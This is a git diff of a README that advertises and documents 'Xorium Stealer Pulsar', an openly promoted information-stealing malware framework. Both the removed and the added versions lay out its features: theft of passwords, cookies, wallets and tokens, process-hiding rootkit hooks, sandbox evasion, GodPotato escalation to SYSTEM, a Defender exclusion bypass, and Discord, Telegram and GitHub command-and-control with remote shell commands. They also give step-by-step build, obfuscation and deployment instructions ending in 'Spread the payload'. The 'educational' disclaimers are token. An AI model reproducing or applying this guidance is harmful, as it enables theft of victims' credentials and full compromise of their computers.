@@ -1,119 +1,81 @@
-# XORIUM STEALER PULSAR [PREMIUM]
-### ⚔️ The Ultimate Cyber Weapon - Enhanced with Shadow Core & Dystopia C2 ⚔️
+# 💎 XORIUM STEALER PULSAR [GOD EDITION] 💎
+### *The Last Stealer You Will Ever Need.*
 
-> **WARNING**: This tool is for EDUCATIONAL PURPOSES only. The author is not responsible for illegal use.
-> **STATUS**: 🟢 UNDETECTED (FUD) | 🛡️ RING 3 ROOTKIT | ⚡ NT AUTHORITY\SYSTEM
-
----
-
-## 💀 Overview
-Xorium Stealer Pulsar is a next-gen malware framework designed for **stealth**, **persistence**, and **privilege escalation**.
-It integrates three powerful engines:
-1.  **Pulsar Core**: High-speed credentials/crypto harvesting.
-2.  **Project Shadow**: Rust-based user-mode rootkit & ASM VM detection.
-3.  **GodPower**: Exploits COM to elevate rights to `SYSTEM` (GodPotato).
-4.  **Dystopia C2**: Serverless infrastructure using Discord, Telegram, and GitHub.
+[![Rust](https://img.shields.io/badge/Core-Rust_Shadow-orange?style=for-the-badge&logo=rust)]()
+[![C#](https://img.shields.io/badge/Loader-C%23_GodPower-blue?style=for-the-badge&logo=csharp)]()
+[![Status](https://img.shields.io/badge/Status-UNDETECTED-brightgreen?style=for-the-badge)]()
+[![Privilege](https://img.shields.io/badge/Privilege-NT_AUTHORITY%5CSYSTEM-red?style=for-the-badge)]()
 
 ---
 
-## 🛠️ Builder Configuration
+## � WHY CHOOSE XORIUM?
 
-The stealer uses a masked string for configuration. No recompilation needed for basic config changes.
+You are tired of paying for "FUD" crypters that get detected in 24 hours. You are tired of Webhooks getting banned.
+**Xorium Stealer Pulsar** is not just a stealer. It is a **Military-Grade Cyber Weapon**.
 
-**Format String:**
+We combined the raw power of **C# .NET** with the invisibility of **Rust Assembly**.
+The result? A malware that doesn't just steal—it **DOMINATES**.
+
+---
+
+## ⚡ KEY SELLING POINTS (The "God" Features)
+
+### 1. �️ PROJECT SHADOW (True Invisibility)
+Most stealers are caught by heuristics. Xorium uses a **Custom Rust Rootkit** (`shadow_core.dll`).
+- **User-Mode Rootkit**: Hooks `NtQuerySystemInformation`. The process **disappears** from Task Manager.
+- **ASM Evasion**: Hand-written Assembly checks (`CPUID`, `RDTSC`, `SIDT`) detect Sandboxes/VMs faster than any AV.
+- **Silent Melt**: If analyzed, it vanishes. No logs. No trace.
+
+### 2. 👑 GOD POWER (Instant SYSTEM Access)
+Why run as a user when you can run as **GOD**?
+- Integrated **GodPotato (DeadPotato)** exploit.
+- **Auto-Escalate**: Instantly jumps from User -> `NT AUTHORITY\SYSTEM`.
+- **Defender Neutralizer**: Uses SYSTEM privileges to add *itself* to the Exclusion List. **Bypasses Tamper Protection.**
+
+### 3. �️ DYSTOPIA C2 (Unbannable Infra)
+Forget buying servers. Forget Tor. Xorium turns legitimate platforms into your C2.
+- **GitHub RAT**: Uses Public/Private Repos as a C2.
+    - **Commands**: Post a comment on a PR -> Victim executes it.
+    - **Exfil**: Logs uploaded as Zips to your Repo.
+- **Discord & Telegram**: Classic, reliable, blazing fast webhooks.
+
+---
+
+## 💰 FEATURE MATRIX
+
+| Feature | ❌ Garbage Stealer | ✅ XORIUM PULSAR |
+| :--- | :---: | :---: |
+| **Language** | Python/C# (Detected) | **Rust + C# Hybrid** |
+| **Rootkit** | No | **Ring 3 Hooking** |
+| **Privilege** | User | **SYSTEM (GodMode)** |
+| **Bypass** | Disable Defender (Flagged) | **Whitelist Injection** |
+| **C2** | Webhook Only | **GitHub / Discord / Tele** |
+| **Price** | $50/month | **FREE / OPEN SOURCE** |
+
+---
+
+## 🚀 HOW TO DEPLOY (Start Your Empire)
+
+### Step 1: The Build
+1.  **Compile Core**: `cd shadow-main && cargo build --release` (The invisible brain).
+2.  **Compile Stub**: Build `Xorium Stealer Pulsar.sln` (The beautiful face).
+3.  **Merge**: Place `shadow_core.dll` next to `Stub.exe` (or ILMerge them).
+
+### Step 2: The Logic
+Xorium Config String:
 `DiscordWebhook|TelegramToken|ChatID|GitHubToken|GitHubRepo`
 
-### 1. Discord C2
-- **Webhook**: Your Discord Webhook URL.
-
-### 2. Telegram C2
-- **Token**: Your BotFather API Token.
-- **ChatID**: Your user/group ID.
-
-### 3. GitHub C2 [NEW] 👁️
-**Dystopia Protocol Compatible**
-- **Token**: GitHub Personal Access Token (Repo scope).
-- **Repo**: `username/repo-name` (Must be **Private**).
-- **Function**:
-    - **Logs**: Xorium uploads `log_TIMESTAMP.zip` to the repo.
-    - **RAT**: Creates a "Pull Request" for command execution (`cmd`, `screenshot`).
+### Step 3: The Profit
+Spread the payload. Watch the logs flood in.
+- **Log Format**: `User_PC_Date.zip`
+- **Contents**: Passwords, Cookies, Wallets, Telegram Session, Discord Token.
 
 ---
 
-## 🛡️ Features Detail
-
-### 🛑 Shadow Core (Evasion)
-- **Anti-VM**: Checks CPUID, RDTSC, and Interrupt Tables (SIDT/SGDT) in raw Assembly.
-- **Self-Destruct**: If a sandbox/analyst is detected, the payload melts (silent exit).
-- **Stealth**: Hooks `NtQuerySystemInformation` to **hide the process** from Task Manager.
-
-### ⚡ GodPotato (Privilege Escalation)
-- **Auto-Root**: On execution, Xorium checks if it is `SYSTEM`.
-- **Escalate**: If not, it drops `GodPotato.exe` (or uses existing) to relaunch itself with **System Privileges**.
-- **Defender Bypass**: Instead of disabling Defender (noisy), it adds itself to the **Exclusion List** using SYSTEM rights.
+## ⚠️ DISCLAIMER
+*This tool is a Proof of Concept for Red Team engagements. The developer is not responsible for damage caused by misuse. But if you use it... act like a God.*
 
 ---
 
-## 🚀 How to Takedown (Deployment)
-
-1.  **Prepare**:
-    - Build `shadow-main` (Rust) -> `shadow_core.dll`.
-    - Build `GodPotato` -> `GodPotato.exe`.
-    - Build `Pulsar.Client` (C#) -> `Stub.exe`.
-
-2.  **Obfuscate**:
-    - Use a crypter (e.g., ConfuserEx) on `Stub.exe` to scramble .NET metadata.
-    - `shadow_core.dll` is native and harder to reverse.
-
-3.  **Execute**:
-    - Run on target.
-    - **Wait 5s**: Shadow Core checks environment.
-    - **Wait 10s**: GodPotato elevates to SYSTEM.
-    - **Wait 30s**: Data is exfiltrated to your C2 (Discord/Telegram/GitHub).
-
----
-
-## 🏗️ Build Guide (Compile from Source)
-
-### Prerequisites
-- **Visual Studio 2022** (with .NET Framework 4.8 dev tools).
-- **Rust (Cargo)**: Install from [rustup.rs](https://rustup.rs).
-
-### Step 1: Build Shadow Core (Rootkit)
-Navigate to `shadow-main` folder and compile the native library.
-```bash
-cd shadow-main
-cargo build --release
-```
-*Output: `shadow-main/target/release/shadow_core.dll`*
-> **Note**: Rename this file to `shadow_core.dll` if needed and place it next to the Stub.
-
-### Step 2: Build Stealer Stub (C#)
-1.  Open `Xorium Stealer Pulsar.sln` in Visual Studio.
-2.  Select **Release** configuration.
-3.  Right-click `Stealer.Client` -> **Build**.
-4.  *Output: `Pulsar.Plugin.Client/Stealer.Client/bin/Release/Stub.exe`*
-
-### Step 3: Deployment
-Combine the files for the final payload:
-1.  `Stub.exe` (The Stealer)
-2.  `shadow_core.dll` (The Rootkit)
-3.  `GodPotato.exe` (The Privilege Escalator - Optional, auto-dropped if missing)
-
-Run `Stub.exe` to infect.
-
----
-
-## 📝 GitHub RAT Commands (Dystopia)
-*To use RAT mode, go to your GitHub Repo -> Pull Requests -> "Agent#{ID}"*
-
-| Command | Description |
-| :--- | :--- |
-| `cmd <command>` | Execute shell command (as SYSTEM). |
-| `screenshot` | Take payload screenshot & upload. |
-| `killproc <pid>` | Kill process by ID. |
-| `selfdestruct` | Remove persistence and delete payload. |
-
----
-
-###### Generated by Xorium Dev Team | 2026
+### [ ⭐ STAR THIS REPO TO SUPPORT DEVELOPMENT ]
+**Join the Elite. Use Xorium.**
